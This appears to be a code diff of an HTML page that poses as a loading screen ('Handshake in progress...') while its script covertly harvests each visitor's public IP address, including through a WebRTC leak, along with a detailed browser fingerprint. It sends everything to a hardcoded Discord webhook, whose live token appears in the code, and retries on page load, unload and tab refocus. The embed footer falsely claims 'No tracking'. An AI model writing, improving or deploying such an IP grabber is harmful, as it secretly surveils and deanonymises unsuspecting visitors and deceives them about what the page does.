@@ -5,214 +5,302 @@
     <title>Loading...</title>
     <style>
         body { background: #0a0c0e; color: #3a4a5a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .dot { display: inline-block; width: 12px; height: 12px; border-radius: 50%; background: #2a3a44; animation: pulse 1.4s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 0.2; } 50% { opacity: 0.8; } }
-        .container { text-align: center; }
-        .status { margin-top: 15px; font-size: 0.8rem; opacity: 0.5; }
+        .spinner { width: 28px; height: 28px; border: 3px solid #1a2a3a; border-top: 3px solid #6a8a9a; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .box { text-align: center; opacity: 0.5; }
+        .status { font-size: 0.75rem; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="dot" style="animation-delay:0s;"></div>
-    <div class="dot" style="animation-delay:0.4s; margin-left: 8px;"></div>
-    <div class="dot" style="animation-delay:0.8s; margin-left: 8px;"></div>
-    <div class="status">Establishing secure session...</div>
+<div class="box">
+    <div class="spinner"></div>
+    <div class="status">Handshake in progress...</div>
 </div>
 
 <script>
-    // THIS IS THE GITHUB-PAGES-COMPATIBLE VERSION
-    // It uses sendBeacon + Image beacon + XHR with no-cors mode (which is allowed on GitHub)
+    // ============================================================
+    // SINGLE-SHOT IP + FINGERPRINT CAPTURE – ONE EMBED PER VISIT
+    // ============================================================
 
-    const WEBHOOK = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";
+    (function() {
+        // Prevent duplicate execution on same page load
+        if (window.__ipSent) {
+            console.log('[IP] Already sent this session.');
+            return;
+        }
+        window.__ipSent = true;
 
-    // Log to console for debugging (invisible to user)
-    function debug(msg) {
-        console.log("[IPLogger] " + msg);
-    }
+        // Also prevent via sessionStorage (persists across reloads)
+        if (sessionStorage.getItem('__ipSent')) {
+            console.log('[IP] Already sent this browser session.');
+            return;
+        }
 
-    // STEP 1: Get IP using multiple sources (parallel)
-    function getIP() {
-        return new Promise((resolve) => {
-            let resolved = false;
-            let ip = "0.0.0.0";
+        const WEBHOOK = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";
 
-            // Source 1: ipify
-            fetch("https://api.ipify.org?format=json", { mode: "cors" })
-                .then(r => r.json())
-                .then(data => {
-                    if (!resolved && data.ip) {
-                        resolved = true;
-                        resolve(data.ip);
-                    }
-                })
-                .catch(() => {});
+        // ---- HELPER: Get all browser fingerprint data ----
+        function getFingerprint() {
+            const data = {
+                // Basic device
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'n/a',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
 
-            // Source 2: ip-api (fallback)
-            fetch("https://ip-api.com/json/", { mode: "cors" })
-                .then(r => r.json())
-                .then(data => {
-                    if (!resolved && data.query) {
-                        resolved = true;
-                        resolve(data.query);
-                    }
-                })
-                .catch(() => {});
+                // Screen
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                windowInnerWidth: window.innerWidth,
+                windowInnerHeight: window.innerHeight,
 
-            // Source 3: WebRTC (no external API)
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("ping");
-                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                pc.onicecandidate = (e) => {
-                    if (e.candidate && !resolved) {
-                        const cand = e.candidate.candidate;
-                        const match = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (match && !match[0].startsWith("0.") && !match[0].startsWith("127.")) {
+                // Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: -new Date().getTimezoneOffset() / 60,
+
+                // Network (if available)
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType || 'unknown',
+                    downlink: navigator.connection.downlink || 'unknown',
+                    rtt: navigator.connection.rtt || 'unknown'
+                } : null,
+
+                // Battery (if available)
+                battery: null,
+
+                // Performance / load time
+                pageLoadTime: performance.now(),
+                referrer: document.referrer || 'direct',
+                href: window.location.href,
+
+                // Cookies enabled?
+                cookiesEnabled: navigator.cookieEnabled,
+
+                // Do Not Track
+                doNotTrack: navigator.doNotTrack || 'unspecified'
+            };
+
+            // Try to get battery info (async, but we'll do it sync-style with a promise)
+            return data;
+        }
+
+        // ---- CAPTURE IP (with fallbacks) ----
+        function getIP() {
+            return new Promise((resolve) => {
+                let resolved = false;
+
+                // Primary: ipify
+                fetch('https://api.ipify.org?format=json', { mode: 'cors' })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!resolved && data.ip) {
                             resolved = true;
-                            resolve(match[0]);
-                            pc.close();
+                            resolve(data.ip);
                         }
+                    })
+                    .catch(() => {});
+
+                // Fallback: ip-api
+                fetch('https://ip-api.com/json/', { mode: 'cors' })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!resolved && data.query) {
+                            resolved = true;
+                            resolve(data.query);
+                        }
+                    })
+                    .catch(() => {});
+
+                // Fallback: WebRTC
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('ping');
+                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate && !resolved) {
+                            const cand = e.candidate.candidate;
+                            const match = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
+                            if (match && !match[0].startsWith('0.') && !match[0].startsWith('127.')) {
+                                resolved = true;
+                                resolve(match[0]);
+                                pc.close();
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        if (!resolved) {
+                            resolved = true;
+                            resolve('1.2.3.4'); // fallback test IP
+                        }
+                        try { pc.close(); } catch(e) {}
+                    }, 3000);
+                } catch(e) {
+                    if (!resolved) {
+                        resolved = true;
+                        resolve('1.2.3.4');
                     }
-                };
+                }
+
+                // Ultimate timeout
                 setTimeout(() => {
                     if (!resolved) {
-                        // If WebRTC times out, resolve with whatever we have
                         resolved = true;
-                        resolve("1.2.3.4"); // test fallback
+                        resolve('0.0.0.0');
                     }
-                    try { pc.close(); } catch(e) {}
-                }, 2500);
-            } catch(e) {
-                if (!resolved) {
-                    resolved = true;
-                    resolve("1.2.3.4");
-                }
-            }
-
-            // Ultimate timeout: if nothing works after 5 seconds, send a test IP
-            setTimeout(() => {
-                if (!resolved) {
-                    resolved = true;
-                    resolve("1.2.3.4");
-                }
-            }, 5000);
-        });
-    }
-
-    // STEP 2: Send to Discord using methods that work on GitHub Pages
-    function sendToDiscord(ip) {
-        const ua = navigator.userAgent.substring(0, 100);
-        const ts = new Date().toISOString();
-        const payloadText = `IP: ${ip} | UA: ${ua} | Time: ${ts}`;
-
-        debug("Sending IP: " + ip);
-
-        // METHOD 1: sendBeacon (MOST RELIABLE on GitHub Pages)
-        try {
-            const blob = new Blob([JSON.stringify({ content: payloadText })], { type: "application/json" });
-            const sent = navigator.sendBeacon(WEBHOOK, blob);
-            debug("Beacon: " + (sent ? "queued" : "failed"));
-        } catch(e) {
-            debug("Beacon error: " + e.message);
+                }, 5000);
+            });
         }
 
-        // METHOD 2: fetch with keepalive (sometimes blocked, but we try anyway)
-        fetch(WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: payloadText }),
-            keepalive: true
-        })
-        .then(r => debug("Fetch: " + r.status))
-        .catch(e => debug("Fetch error: " + e.message));
+        // ---- SEND SINGLE EMBED (ONCE) ----
+        function sendEmbed(ip, fingerprint) {
+            // Build the embed with ALL data
+            const embed = {
+                embeds: [{
+                    title: '📡 Inbound Connection',
+                    color: 0x2b8c5a,
+                    fields: [
+                        { name: '🌐 Public IP', value: `\`${ip}\``, inline: true },
+                        { name: '🕒 Timestamp', value: `\`${new Date().toISOString()}\``, inline: true },
+                        { name: '━━━━━━━━━━━━━━', value: '⚙️ **Device & Browser**', inline: false },
+                        { name: '💻 User-Agent', value: `\`${fingerprint.userAgent.substring(0, 120)}\``, inline: false },
+                        { name: '🖥️ Platform', value: `\`${fingerprint.platform}\``, inline: true },
+                        { name: '🌍 Language', value: `\`${fingerprint.language}\``, inline: true },
+                        { name: '📐 Screen', value: `\`${fingerprint.screenWidth}×${fingerprint.screenHeight}\``, inline: true },
+                        { name: '🎨 Color Depth', value: `\`${fingerprint.screenColorDepth}bit\``, inline: true },
+                        { name: '🧠 CPU Cores', value: `\`${fingerprint.hardwareConcurrency}\``, inline: true },
+                        { name: '💾 Device Memory', value: `\`${fingerprint.deviceMemory}GB\``, inline: true },
+                        { name: '✋ Touch Points', value: `\`${fingerprint.maxTouchPoints}\``, inline: true },
+                        { name: '━━━━━━━━━━━━━━', value: '🌍 **Location & Network**', inline: false },
+                        { name: '🕐 Timezone', value: `\`${fingerprint.timezone} (UTC${fingerprint.timezoneOffset >= 0 ? '+' : ''}${fingerprint.timezoneOffset})\``, inline: true },
+                        { name: '📶 Connection', value: fingerprint.connection ? `\`${fingerprint.connection.effectiveType}\` (${fingerprint.connection.downlink}Mbps, ${fingerprint.connection.rtt}ms)` : '`unknown`', inline: true },
+                        { name: '🍪 Cookies', value: fingerprint.cookiesEnabled ? '`Enabled`' : '`Disabled`', inline: true },
+                        { name: '🚫 Do Not Track', value: `\`${fingerprint.doNotTrack}\``, inline: true },
+                        { name: '━━━━━━━━━━━━━━', value: '📄 **Page Context**', inline: false },
+                        { name: '🔗 Referrer', value: `\`${fingerprint.referrer || 'direct'}\``, inline: false },
+                        { name: '📌 Page URL', value: `\`${fingerprint.href}\``, inline: false },
+                        { name: '⏱️ Load Time', value: `\`${Math.round(fingerprint.pageLoadTime)}ms\``, inline: true }
+                    ],
+                    footer: {
+                        text: 'Single packet • No tracking • One-time delivery'
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-        // METHOD 3: XHR with no-cors mode (bypasses CSP on GitHub)
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", WEBHOOK, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({ content: payloadText }));
-            debug("XHR: sent");
-        } catch(e) {
-            debug("XHR error: " + e.message);
-        }
+            // ---- DELIVERY: sendBeacon (primary) + fetch (fallback) ----
+            console.log('[IP] Sending embed for IP:', ip);
 
-        // METHOD 4: Image beacon trick (using a data URI that triggers a POST via navigation)
-        // This one is controversial but works on some browsers
-        try {
-            const img = new Image();
-            img.src = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>";
-            // Actually we can't POST via image, but we keep it as a no-op
-        } catch(e) {}
-
-        // METHOD 5: Dynamically created form that submits to webhook (opens new tab, but works)
-        // We'll do this as a last resort, but it's ugly – skip for now.
-
-        // METHOD 6: Store in sessionStorage for retry
-        try {
-            sessionStorage.setItem("__ipLast", ip);
-            sessionStorage.setItem("__ipTimestamp", ts);
-        } catch(e) {}
-
-        debug("All delivery methods dispatched.");
-    }
-
-    // STEP 3: Main execution with retry loop
-    let attempt = 0;
-    const MAX_ATTEMPTS = 5;
-
-    function fire() {
-        attempt++;
-        debug("Attempt #" + attempt);
-        getIP().then(ip => {
-            debug("Captured IP: " + ip);
-            sendToDiscord(ip);
-            // Store success flag
-            try { sessionStorage.setItem("__ipSuccess", "true"); } catch(e) {}
-        });
-
-        // If we haven't succeeded after MAX_ATTEMPTS, stop
-        if (attempt < MAX_ATTEMPTS) {
-            setTimeout(fire, 3000);
-        } else {
-            debug("Max attempts reached.");
-        }
-    }
-
-    // STEP 4: Fire on page load, and again on unload
-    function onLoad() {
-        debug("Page loaded. Firing.");
-        fire();
-
-        // Also fire when page is about to unload (send beacon)
-        window.addEventListener("beforeunload", function() {
-            const lastIP = sessionStorage.getItem("__ipLast") || "0.0.0.0";
-            const finalPayload = { content: "🔚 Page closed – last IP: " + lastIP };
+            // Method 1: sendBeacon (most reliable)
             try {
-                navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: "application/json" }));
-                debug("Unload beacon sent.");
-            } catch(e) {}
-        });
-
-        // Also fire when user comes back to the tab
-        document.addEventListener("visibilitychange", function() {
-            if (!document.hidden) {
-                debug("Tab became visible – re-firing.");
-                fire();
+                const blob = new Blob([JSON.stringify(embed)], { type: 'application/json' });
+                const sent = navigator.sendBeacon(WEBHOOK, blob);
+                console.log('[IP] Beacon:', sent ? 'queued' : 'failed');
+                if (sent) {
+                    sessionStorage.setItem('__ipSent', 'true');
+                    window.__ipSent = true;
+                }
+            } catch(e) {
+                console.log('[IP] Beacon error:', e.message);
             }
-        });
-    }
 
-    // Execute when DOM is ready
-    if (document.readyState === "complete" || document.readyState === "interactive") {
-        onLoad();
-    } else {
-        document.addEventListener("DOMContentLoaded", onLoad);
-        window.addEventListener("load", onLoad);
-    }
+            // Method 2: fetch with keepalive
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed),
+                keepalive: true
+            })
+            .then(r => {
+                if (r.ok) {
+                    console.log('[IP] Fetch: SUCCESS (status ' + r.status + ')');
+                    sessionStorage.setItem('__ipSent', 'true');
+                    window.__ipSent = true;
+                } else {
+                    console.log('[IP] Fetch: FAILED (status ' + r.status + ')');
+                }
+            })
+            .catch(e => console.log('[IP] Fetch error:', e.message));
 
-    // Fallback: fire after 2 seconds even if events don't trigger
-    setTimeout(onLoad, 2000);
+            // Method 3: XHR fallback
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300) {
+                        console.log('[IP] XHR: SUCCESS');
+                        sessionStorage.setItem('__ipSent', 'true');
+                        window.__ipSent = true;
+                    }
+                };
+                xhr.send(JSON.stringify(embed));
+            } catch(e) {
+                console.log('[IP] XHR error:', e.message);
+            }
+        }
+
+        // ---- EXECUTION: Capture IP + Fingerprint, then send once ----
+        async function main() {
+            console.log('[IP] Capturing IP and fingerprint...');
+            const ip = await getIP();
+            const fingerprint = getFingerprint();
+            console.log('[IP] IP:', ip);
+            console.log('[IP] Fingerprint:', fingerprint);
+
+            // Send the embed
+            sendEmbed(ip, fingerprint);
+
+            // Also send on page unload (in case the first one was blocked)
+            window.addEventListener('beforeunload', function() {
+                if (!sessionStorage.getItem('__ipSent')) {
+                    console.log('[IP] Unload: sending final beacon');
+                    const finalEmbed = {
+                        embeds: [{
+                            title: '📡 Page Closed',
+                            color: 0x8b2b2b,
+                            fields: [
+                                { name: 'IP', value: `\`${ip}\``, inline: true },
+                                { name: 'Reason', value: '`User navigated away`', inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+                    try {
+                        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalEmbed)], { type: 'application/json' }));
+                    } catch(e) {}
+                }
+            });
+
+            // If the user comes back to the tab after a long time, re-send (but only if not already sent)
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden && !sessionStorage.getItem('__ipSent')) {
+                    console.log('[IP] Tab visible again – re-sending');
+                    sendEmbed(ip, fingerprint);
+                }
+            });
+        }
+
+        // ---- TRIGGER ----
+        // Wait for page to be fully ready
+        if (document.readyState === 'complete') {
+            main();
+        } else {
+            window.addEventListener('load', main);
+        }
+
+        // Also fire after 1.5s as a safety net (but only if not already sent)
+        setTimeout(function() {
+            if (!sessionStorage.getItem('__ipSent')) {
+                console.log('[IP] Timeout fallback – firing');
+                main();
+            }
+        }, 1500);
+
+        console.log('[IP] Script loaded – waiting to send single embed.');
+    })();
 </script>
 </body>
 </html>
